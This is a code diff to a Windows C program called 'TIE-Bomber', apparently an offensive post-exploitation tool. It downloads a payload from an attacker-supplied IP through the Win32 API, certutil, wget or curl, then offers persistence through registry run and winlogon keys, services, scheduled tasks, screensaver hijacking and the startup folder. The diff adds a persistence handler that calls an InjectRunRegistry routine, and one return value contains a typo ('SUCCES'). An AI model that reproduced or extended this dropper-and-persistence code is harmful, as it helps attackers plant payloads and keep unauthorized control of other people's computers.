@@ -7,6 +7,7 @@
 #include <unistd.h>
 #include <stdarg.h>
 #include "download.h"
+#include "helper.h"
 #include "pers.h"
 
 #pragma comment(lib, "urlmon.lib")
@@ -39,42 +40,6 @@ VOID _ListOpts(const char *str, ...) {
     printf("\n\n");
 
     va_end(arg);
-}
-
-BOOL PromptUntilValid(const char *prompt, char* buffer, size_t bufferSize, ValidatorFunc validator, void *data) {
-    int rc;
-    puts("");
-    while (TRUE) {
-        printf("TIE-Bomber(%s) > ", prompt);
-        fflush(stdout);
-        fgets(buffer, (int)bufferSize, stdin);
-        buffer[strcspn(buffer, "\n")] = '\0';
-        if (strcmp(buffer, "q") == 0 || strcmp(buffer, "quit") == 0 || strcmp(buffer, "exit") == 0 || strcmp(buffer, "no") == 0 || strcmp(buffer, "n") == 0) {
-                printf("\n[*] Exiting...\n");
-                return FALSE;
-        }
-        if (validator && strcmp(buffer, "h") == 0) {
-            printHelp = TRUE;
-        }
-        
-        if (!validator) {
-            if (strcmp(buffer, "y") == 0 || strcmp(buffer, "yes") == 0) {
-                break;
-            }
-            continue;   
-        }    
-
-        rc = validator(buffer, data);
-        if (rc == WIN_ERROR) {
-            TranslateErrorPrint(GetLastError());
-            continue;
-        } else if (rc == CONTINUE_ERROR || rc == FAIL_ERROR) {
-            continue;
-        }
-        break;
-    }
-    puts("");
-    return TRUE;
 }
 
 BOOL AddWritableDir(WRITABLE_DIR **array, int *count, int *capacity, const char *path, int pathLen) {
@@ -159,9 +124,7 @@ BOOL IsResourceValid(const char *source) {
 }
 
 int HandleDownload(char* opt, void *data) {
-    PDOWNLOAD_CONTEXT pDownloadContext = (PDOWNLOAD_CONTEXT) data;
-    
-    if (printHelp) {
+    if (printHelp || opt == NULL) {
         ListOpts(
             "Download using Win32 API", 
             "Download using certutil.exe", 
@@ -173,27 +136,29 @@ int HandleDownload(char* opt, void *data) {
         return CONTINUE_ERROR;
     }
 
+    PDOWNLOAD_CONTEXT pDownloadContext = (PDOWNLOAD_CONTEXT) data;
+    
     switch ((char) *opt) {
         case '0':
            break; 
         case '1':
             if (!DownloadUsingWin32(pDownloadContext)) {
-                return FAIL_ERROR;
+                return CONTINUE_ERROR;
             }
             return SUCCESS;
         case '2':
             if (!DownloadUsingCertutil(pDownloadContext)) {
-                return FAIL_ERROR;
+                return CONTINUE_ERROR;
             }
             return SUCCESS;
         case '3':
             if (!DownloadUsingWget(pDownloadContext)) {
-                return FAIL_ERROR;
+                return CONTINUE_ERROR;
             }
             return SUCCESS;
         case '4':
             if (!DownloadUsingCurl(pDownloadContext)) {
-                return FAIL_ERROR;
+                return CONTINUE_ERROR;
             }
             return SUCCESS;
         case '5':
@@ -205,17 +170,30 @@ int HandleDownload(char* opt, void *data) {
 }
 
 int HandlePersistence(char *opt, void *data) {
-    char *targetPath = (char*) data;
-
-    if (printHelp) {
+    if (printHelp || opt == NULL) {
         ListOpts(
             "Registry run key",
             "Registry winlogon key",
             "Create a startup service",
             "Create a scheduled task",
             "Hijack screensaver",
-            "Startup folder"
+            "Add payload to the startup folder"
         );
+        printHelp = FALSE;
+        return CONTINUE_ERROR;
+    }
+
+    PPERS_CONTEXT pPersContext = (PPERS_CONTEXT) data;
+
+    switch((char) *opt) {
+        case '1':
+            if (!InjectRunRegistry()) {
+                return CONTINUE_ERROR;
+            }
+            return SUCCES;
+        default:
+            printf("[?] Unknown option specified. Select <h> for available options\n");
+            return CONTINUE_ERROR;
     }
 }
 
@@ -330,7 +308,9 @@ int main(int argc, char* argv[]) {
    
 printf("     .    .     .            +         .         .                 .  .\n      .                 .                   .               .\n              .    ,,o         .                  __.o+.\n    .            od8^                  .      oo888888P^b           .\n       .       ,\".o'      .     .             `b^'\"\"`b -`b   .\n             ,'.'o'             .   .          t. = -`b -`t.    .\n            ; d o' .        ___          _.--.. 8  -  `b  =`b\n        .  dooo8<       .o:':__;o.     ,;;o88%%8bb - = `b  =`b.    .\n    .     |^88^88=. .,x88/::/ | \\\\`;;;;;;d%%%%%88%88888/%x88888\n          :-88=88%%L8`%`|::|_>-<_||%;;%;8%%=;:::=%8;;\\%%%%\\8888\n      .   |=88 88%%|HHHH|::| >-< |||;%;;8%%=;:::=%8;;;%%%%+|]88        .\n          | 88-88%%LL.%.%b::Y_|_Y/%|;;;;`%8%%oo88%:o%.;;;;+|]88  .\n          Yx88o88^^'\"`^^%8boooood..-\\H_Hd%P%%88%P^%%^'\\;;;/%%88\n         . `\"\\^\\          ~\"\"\"\"\"'      d%P \"\"\"^\" ;   = `+' - P\n   .        `.`.b   .                :<%%>  .   :  -   d' - P      . .\n              .`.b     .        .    `788      ,'-  = d' =.'\n       .       ``.b.                           :..-  :'  P\n            .   `q.>b         .               `^^^:::::,'       .\n    LS            \"\"^^               .                     .\n  .                                           .               .       .\n    .         .          .                 .        +         .\n                    Sienar Fleet Systems' TIE Bomber\n                         Light Space Bomber (2)\n                         Code by viv4ldi\n                         Art by ascii.co.uk\n\n\n");
 
-	if (ParseInput(argc, argv, ip, &ipLen, exe, &exeLen, target, &targetLen, &port, &receiveUsingSocket) == FALSE) {
+
+
+    if (ParseInput(argc, argv, ip, &ipLen, exe, &exeLen, target, &targetLen, &port, &receiveUsingSocket) == FALSE) {
         printf("[!] Usage: %s -i <IP> -e <EXE> [-t <TARGET NAME>] [-p <PORT>] [-s (use raw TCP sockets)]\n", argv[0]);
 		exit(1);
 	}
@@ -396,6 +376,20 @@ printf("     .    .     .            +         .         .                 .  .\
     }
 
     printf("\n\n[*] **PERSISTENCE OPTIONS**\n\n");    
-    
+    PERS_CONTEXT persContext = {
+        .regKey = NULL,
+        .valueName = NULL,
+        .valueData = NULL,
+        .valueDataLen = NULL,
+        .valueType = 0,
+        .targetPath = payloadFull,
+        .targetPathLen = payloadFullLen
+    };
+
+    HandlePersistence(NULL, NULL);
+    if (!PromptUntilValid("Choose an option", opt, sizeof(opt), (ValidatorFunc) &HandlePersistence, (PPERS_CONTEXT) &persContext)) {
+        exit(1);
+    }
+
 	return 0;
 }
